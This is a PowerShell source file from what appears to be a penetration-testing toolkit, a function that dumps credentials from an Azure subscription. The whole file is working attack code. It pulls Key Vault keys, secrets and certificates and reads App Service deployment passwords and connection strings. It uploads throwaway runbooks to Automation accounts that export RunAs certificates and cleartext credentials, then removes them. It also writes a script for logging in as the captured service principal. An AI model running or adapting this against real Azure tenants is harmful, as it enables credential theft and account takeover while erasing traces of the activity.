<#
    File: Get-AzurePasswords.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2019
    Description: PowerShell function for dumping Azure credentials.
#>


# Check if the AzureRM Module is installed and imported
if(!(Get-Module AzureRM)){
    try{Import-Module AzureRM -ErrorAction Stop}
    catch{Install-Module -Name AzureRM -Confirm}
    }

# Check if the Azure Module is installed and imported
if(!(Get-Module Azure)){
    try{Import-Module Azure -ErrorAction Stop}
    catch{Install-Module -Name Azure -Confirm}
    }


Function Get-AzurePasswords
{
<#
    .SYNOPSIS
        Dumps all available credentials from an Azure subscription. Pipe to Out-Gridview or Export-CSV for easier parsing.
    .DESCRIPTION
        This function will look for any available credentials and certificates store in Key Vaults, App Services Configurations, and Automation accounts. 
        If the Azure management account has permissions, it will read the values directly out of the Key Vaults and App Services Configs.
        A runbook will be spun up for dumping automation account credentials, so it will create a log entry in the automation jobs.
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER ExportCerts
        Flag for saving private certs locally.           
    .EXAMPLE
        PS C:\MicroBurst> Get-AzurePasswords -Verbose | Out-GridView
        VERBOSE: Logged In as testaccount@example.com
        VERBOSE: Getting List of Key Vaults...
        VERBOSE: 	Exporting items from example-private
        VERBOSE: 	Exporting items from PasswordStore
        VERBOSE: 		Getting Key value for the example-Test Key
        VERBOSE: 		Getting Key value for the RSA-KEY-1 Key
        VERBOSE: 		Getting Key value for the TestCertificate Key
        VERBOSE: 		Getting Secret value for the example-Test Secret
        VERBOSE: 			Unable to export Secret value for example-Test
        VERBOSE: 		Getting Secret value for the SuperSecretPassword Secret
        VERBOSE: 		Getting Secret value for the TestCertificate Secret
        VERBOSE: Getting List of Azure App Services...
        VERBOSE: 	Profile available for example1
        VERBOSE: 	Profile available for example2
        VERBOSE: 	Profile available for example3
        VERBOSE: Getting List of Azure Automation Accounts...
        VERBOSE: 	Getting credentials for testAccount using the lGVeLPZARrTJdDu.ps1 Runbook
        VERBOSE: 		Waiting for the automation job to complete
        VERBOSE: Password Dumping Activities Have Completed

    .LINK
    https://blog.netspi.com/get-azurepasswords
    https://blog.netspi.com/exporting-azure-runas-certificates
#>


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",
        
        [parameter(Mandatory=$false,
        HelpMessage="Dump Key Vault Keys.")]
        [ValidateSet("Y","N")]
        [String]$Keys = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Dump App Services Configurations.")]
        [ValidateSet("Y","N")]
        [String]$AppServices = "Y",
        
        [parameter(Mandatory=$false,
        HelpMessage="Dump Automation Accounts.")]
        [ValidateSet("Y","N")]
        [String]$AutomationAccounts = "Y",

        [parameter(Mandatory=$false,
        HelpMessage="Password to use for exporting the Automation certificates.")]
        [String]$CertificatePassword = "TotallyNotaHardcodedPassword...",

        [Parameter(Mandatory=$false,
        HelpMessage="Export the Key Vault certificates to local files.")]
        [ValidateSet("Y","N")]
        [string]$ExportCerts = "N"

    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzureRmContext
    $accountName = $LoginStatus.Account
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Login-AzureRmAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}

    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzureRmSubscription"
    if ($Subscription){        
        Select-AzureRmSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzureRmSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | out-gridview -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Get-AzurePasswords -Subscription $sub -ExportCerts $ExportCerts -Keys $Keys -AppServices $AppServices -AutomationAccounts $AutomationAccounts -CertificatePassword $CertificatePassword}
        break
    }

    Write-Verbose "Logged In as $accountName"

    # Create data table to house results
    $TempTblCreds = New-Object System.Data.DataTable 
    $TempTblCreds.Columns.Add("Type") | Out-Null
    $TempTblCreds.Columns.Add("Name") | Out-Null
    $TempTblCreds.Columns.Add("Username") | Out-Null
    $TempTblCreds.Columns.Add("Value") | Out-Null
    $TempTblCreds.Columns.Add("PublishURL") | Out-Null
    $TempTblCreds.Columns.Add("Created") | Out-Null
    $TempTblCreds.Columns.Add("Updated") | Out-Null
    $TempTblCreds.Columns.Add("Enabled") | Out-Null
    $TempTblCreds.Columns.Add("Content Type") | Out-Null
    $TempTblCreds.Columns.Add("Vault") | Out-Null
    $TempTblCreds.Columns.Add("Subscription") | Out-Null

    if($Keys -eq 'Y'){
        # Key Vault Section
        $vaults = Get-AzureRmKeyVault
        Write-Verbose "Getting List of Key Vaults..."
        $subName = (Get-AzureRmSubscription -SubscriptionId $Subscription).Name

        foreach ($vault in $vaults){
            $vaultName = $vault.VaultName
            
            try{
                $keylist = Get-AzureKeyVaultKey -VaultName $vaultName -ErrorAction Stop

                # Dump Keys
                Write-Verbose "`tExporting items from $vaultName"
                foreach ($key in $keylist){
                    $keyname = $key.Name
                    Write-Verbose "`t`tGetting Key value for the $keyname Key"
                    $keyValue = Get-AzureKeyVaultKey -VaultName $vault.VaultName -Name $key.Name
            
                    # Add Key to the table
                    $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null

                }
            }
            catch{Write-Verbose "`t`tUnable to access the keys for the $vaultName key vault"}
            

            # Dump Secrets
            try{$secrets = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -ErrorAction Stop}
            catch{Write-Verbose "`t`tUnable to access secrets for the $vaultName key vault"; Continue}

            foreach ($secret in $secrets){
                $secretname = $secret.Name
                Write-Verbose "`t`tGetting Secret value for the $secretname Secret"
                Try{
                    $secretValue = Get-AzureKeyVaultSecret -VaultName $vault.VaultName -Name $secret.Name -ErrorAction Stop

                    $secretType = $secretValue.ContentType

                    # Write Private Certs to file
                    if (($ExportCerts -eq "Y") -and ($secretType  -eq "application/x-pkcs12")){
                            Write-Verbose "`t`t`tWriting certificate for $secretname to $pwd\$secretname.pfx"
                            $secretBytes = [convert]::FromBase64String($secretValue.SecretValueText)
                            [IO.File]::WriteAllBytes("$pwd\$secretname.pfx", $secretBytes)
                        }
                
                    # Add Secret to the table
                    $TempTblCreds.Rows.Add("Secret",$secretValue.Name,"N/A",$secretValue.SecretValueText,"N/A",$secretValue.Created,$secretValue.Updated,$secretValue.Enabled,$secretValue.ContentType,$vault.VaultName,$subName) | Out-Null

                    }

                Catch{Write-Verbose "`t`t`tUnable to export Secret value for $secretname"}

            }

        }
    }

    if($AppServices -eq 'Y'){
        # App Services Section
        Write-Verbose "Getting List of Azure App Services..."

        # Read App Services configs
        $appServs = Get-AzureRmWebApp
        $appServs | ForEach-Object{
            $appServiceName = $_.Name
            $resourceGroupName = Get-AzureRmResource -ResourceId $_.Id | select ResourceGroupName

            # Get each config 
            try{
                [xml]$configFile = Get-AzureRmWebAppPublishingProfile -ResourceGroup $resourceGroupName.ResourceGroupName -Name $_.Name -ErrorAction Stop
            
                if ($configFile){
                    foreach ($profile in $configFile.publishData.publishProfile){
                        # Read Deployment Passwords and add to the output table
                        $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName,$profile.userName,$profile.userPWD,$profile.publishUrl,"N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                    
                        # Parse Connection Strings                    
                        if ($profile.SQLServerDBConnectionString){
                            $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName+"-ConnectionString","N/A",$profile.SQLServerDBConnectionString,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
                        }
                        if ($profile.mySQLDBConnectionString){
                            $TempTblCreds.Rows.Add("AppServiceConfig",$profile.profileName+"-ConnectionString","N/A",$profile.mySQLDBConnectionString,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null
                        }
                    }
                    # Grab additional custom connection strings
                    $resourceName = $_.Name+"/connectionstrings"
                    $resource = Invoke-AzureRmResourceAction -ResourceGroupName $_.ResourceGroup -ResourceType Microsoft.Web/sites/config -ResourceName $resourceName -Action list -ApiVersion 2015-08-01 -Force
                    $propName = $resource.properties | gm -M NoteProperty | select name
                    if($resource.Properties.($propName.Name).type -eq 3){$TempTblCreds.Rows.Add("AppServiceConfig",$_.Name+"-Custom-ConnectionString","N/A",$resource.Properties.($propName.Name).value,"N/A","N/A","N/A","N/A","ConnectionString","N/A",$subName) | Out-Null}
                }
                Write-Verbose "`tProfile available for $appServiceName"
            }
            catch{Write-Verbose "`tNo profile available for $appServiceName"}
        }
    }

    if ($AutomationAccounts -eq 'Y'){
        # Automation Accounts Section
        $AutoAccounts = Get-AzureRmAutomationAccount
        Write-Verbose "Getting List of Azure Automation Accounts..."
        foreach ($AutoAccount in $AutoAccounts){

            $verboseName = $AutoAccount.AutomationAccountName

            # Grab the automation cred username
            $autoCred = (Get-AzureRmAutomationCredential -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName).Name

            # Set Random names for the runbooks. Prevents conflict issues
            $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
                                
            # Set the runbook to export the runas certificate and write Script to local file
            "`$RunAsCert = Get-AutomationCertificate -Name 'AzureRunAsCertificate'" | Out-File -FilePath "$pwd\$jobName.ps1" 
            "`$CertificatePath = Join-Path `$env:temp $verboseName-AzureRunAsCertificate.pfx" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            "`$Cert = `$RunAsCert.Export('pfx','$CertificatePassword')" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            "Set-Content -Value `$Cert -Path `$CertificatePath -Force -Encoding Byte | Write-Verbose " | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        
            # Cast to Base64 string in Automation, write it to output
            "`$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes(`$CertificatePath))" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
            "write-output `$base64string" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
                        
            # Write local script to start authentication
            $AutoAccountRG = $AutoAccount.ResourceGroupName

            # Get this data into the script now, so you don't need an account later to grab it
            $thumbprint = (Get-AzureRmAutomationCertificate -ResourceGroupName $AutoAccountRG -AutomationAccountName $verboseName | where Name -EQ 'AzureRunAsCertificate').Thumbprint
            $tenantID = (Get-AzureRmContext).Tenant.Id
            # This is a hackish workaround for right now... There's no easy ways for grabbing the automation account AppID. If the automation account SPN is renamed in AzureAD, this won't work
            $appId = (Get-AzureRmADApplication -DisplayNameStartWith $verboseName).ApplicationId
            if ($appId -eq $null){Write-Warning "No AppID found for the $verboseName Automation Account. Look up the AppId in AzureAD and add it to the AuthenticateAs-$verboseName.ps1 file"}

            "`$thumbprint = '$thumbprint'"| Out-File -FilePath "$pwd\AuthenticateAs-$verboseName.ps1"
            "`$tenantID = '$tenantID'" | Out-File -FilePath "$pwd\AuthenticateAs-$verboseName.ps1" -Append                                               
            "`$appId = '$appId'" | Out-File -FilePath "$pwd\AuthenticateAs-$verboseName.ps1" -Append

            "`$SecureCertificatePassword = ConvertTo-SecureString -String $CertificatePassword -AsPlainText -Force" | Out-File -FilePath "$pwd\AuthenticateAs-$verboseName.ps1" -Append
            "Import-PfxCertificate -FilePath .\$verboseName-AzureRunAsCertificate.pfx -CertStoreLocation Cert:\LocalMachine\My -Password `$SecureCertificatePassword" | Out-File -FilePath "$pwd\AuthenticateAs-$verboseName.ps1" -Append
            "Add-AzureRmAccount -ServicePrincipal -Tenant `$tenantID -CertificateThumbprint `$thumbprint -ApplicationId `$appId" | Out-File -FilePath "$pwd\AuthenticateAs-$verboseName.ps1" -Append

                
            # If other creds are available, get the credentials from the runbook
            if ($autoCred -ne $null){
                # foreach credential in autocred, create a new file, add the name to the list
                foreach ($subCred in $autoCred){
                    # Set Random names for the runbooks. Prevents conflict issues
                    $jobName2 = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

                    # Write Script to local file
                    "`$myCredential = Get-AutomationPSCredential -Name '$subCred'" | Out-File -FilePath "$pwd\$jobName2.ps1" 
                    "`$userName = `$myCredential.UserName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "write-output `$userName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    "write-output `$password"| Out-File -FilePath "$pwd\$jobName2.ps1" -Append
                    $jobList += @($jobName2)
                }
            }                               

            # If the runbook didn't write, don't run it
            if (Test-Path $pwd\$jobName.ps1 -PathType Leaf){
                Write-Verbose "`tGetting the RunAs certificate for $verboseName using the $jobName.ps1 Runbook"
                try{
                    Import-AzureRmAutomationRunbook -Path $pwd\$jobName.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobName | Out-Null

                    # Publish the runbook
                    Publish-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobName | Out-Null

                    # Run the runbook and get the job id
                    $jobID = Start-AzureRmAutomationRunbook -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId

                    $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status

                    # Wait for the job to complete
                    Write-Verbose "`t`tWaiting for the automation job to complete"
                    while($jobstatus.Status -ne "Completed"){
                        $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                    }    

                    $jobOutput = Get-AzureRmAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzureRmAutomationJobOutputRecord | Select-Object -ExpandProperty Value
                                                
                    # Write it to a local file
                    $FileName = Join-Path $pwd $verboseName"-AzureRunAsCertificate.pfx"
                    [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($jobOutput.Values))

                    $instructionsMSG = "`t`t`tRun AuthenticateAs-$verboseName.ps1 (as a local admin) to import the cert and login as the $verboseName Automation account"
                    Write-Verbose $instructionsMSG

                    # clean up
                    Write-Verbose "`t`tRemoving $jobName runbook from $verboseName Automation Account"
                    Remove-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                }
                Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
            }
            
            # If there's cleartext credentials, run the second runbook
            if ($autoCred -ne $null){
                $autoCredIter = 0   
                Write-Verbose "`tGetting cleartext credentials for the $verboseName Automation Account"
                foreach ($jobToRun in $jobList){
                    # If the additional runbooks didn't write, don't run them
                    if (Test-Path $pwd\$jobToRun.ps1 -PathType Leaf){
                        $autoCredCurrent = $autoCred[$autoCredIter]
                        Write-Verbose "`t`tGetting cleartext credentials for $autoCredCurrent using the $jobToRun.ps1 Runbook"
                        $autoCredIter++
                        try{
                            Import-AzureRmAutomationRunbook -Path $pwd\$jobToRun.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRun | Out-Null

                            # publish the runbook
                            Publish-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobToRun | Out-Null

                            # run the runbook and get the job id
                            $jobID = Start-AzureRmAutomationRunbook -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId

                            $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status

                            # Wait for the job to complete
                            Write-Verbose "`t`t`tWaiting for the automation job to complete"
                            while($jobstatus.Status -ne "Completed"){
                                $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
                            }    

                            # If there was an actual cred here, get the output and add it to the table                    
                            try{
                                # Get the output
                                $jobOutput = (Get-AzureRmAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | select Summary).Summary
                                
                                if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
        
                                #write to the table
                                $TempTblCreds.Rows.Add("AzureAutomation Account",$AutoAccount.AutomationAccountName,$jobOutput[0],$jobOutput[1],"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
                            }
                            catch {}

                            # clean up
                            Write-Verbose "`t`tRemoving $jobToRun runbook from $verboseName Automation Account"
                            Remove-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                        }
                        Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}

                        # Clean up local temp files
                        Remove-Item $pwd\$jobToRun.ps1 | Out-Null
                    }
                }
            }
            # Clean up local temp files
            Remove-Item $pwd\$jobName.ps1 | Out-Null
        }
    }
    Write-Verbose "Password Dumping Activities Have Completed"

    # Output Creds
    Write-Output $TempTblCreds
}



